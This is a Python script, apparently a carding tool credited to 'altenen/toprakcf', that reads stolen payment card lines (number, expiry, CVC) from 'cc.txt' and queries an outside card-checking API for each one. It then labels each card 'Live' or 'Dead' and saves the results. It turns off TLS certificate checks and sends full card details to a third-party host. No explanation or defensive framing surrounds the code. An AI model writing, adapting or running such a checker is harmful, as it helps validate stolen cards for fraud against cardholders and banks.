import os

os.system('python -m pip install requests termcolor colorama urllib3 datetime')

import requests, time, urllib3
from datetime import datetime
from termcolor import colored
import colorama
from colorama import Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print(Fore.RED + ' __..  ..__ .__ .___.__..  . __ .  ..___ __ .  ..___.__ ')
print(Fore.LIGHTRED_EX + ' (__ |  |[__)[ __[__ |  ||\ |/  `|__|[__ /  `|_/ [__ [__) ')
print(Fore.RED + ' .__)|__||  \[_./[___|__|| \|\__.|  |[___\__.|  \[___|  \ ')
print(Fore.LIGHTGREEN_EX + 'altenen/toprakcf')                                                               
print(Fore.GREEN + 'Be sure your card file is called "cc.txt" ')          
time.sleep(3)                                                                
 

 

ccFile = "cc.txt"
outputFile = "cc_checked_{}.txt".format(int(datetime.timestamp(datetime.now())))
xcheckerAPIURL = "https://www.xchecker.cc/api.php?cc={}|{}|{}|{}"
headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Accept": "*/*",
}
 
def writeFileOutput(data, file, mode="a"):
    f = open(file, mode)
    f.write("{}\n".format(data))
    f.close()
    if "|Live|" in data:
        print(colored(data, "green", attrs=["bold"]))
    elif "|Dead|" in data:
        print(colored(data, "red", attrs=["bold"]))
    else:
        print(colored(data, "white", attrs=["bold"]))
 
def main():
    if os.path.exists(ccFile):
        with open(ccFile) as f:
            writeFileOutput("----------------------------------------------", outputFile)
            for cc in f:
                cc = cc.replace("\r", "").replace("\n", "")
                try:
                    ccNumber = cc.split("|")[0]
                    expMonth = cc.split("|")[1]
                    expYear = cc.split("|")[2]
                    cvc = cc.split("|")[3]
                except:
                    writeFileOutput("{} => Format error. Use ccNumber|expMonth|expYear|cvc".format(cc), outputFile)
                    continue
                url = xcheckerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                while True:
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
                        data = response.json()
                        if "ccNumber" in data:
                            output = data["ccNumber"]
                            if "bankName" in data:
                                output += "|" + data["bankName"]
                            output += "|" + data["status"] + "|" + data["details"] + "XXX"
                        else:
                            output = "{} => {}".format(ccNumber, data["error"])
                        writeFileOutput(output + "XXX", outputFile)
                        break
                    else:
                        writeFileOutput("HTTP service error: {}, retry...".format(response.status_code), outputFile)
                        time.sleep(1000)
    else:
        print("File {} not found in current directory".format(ccFile))
 
if __name__ == "__main__":
    main()
 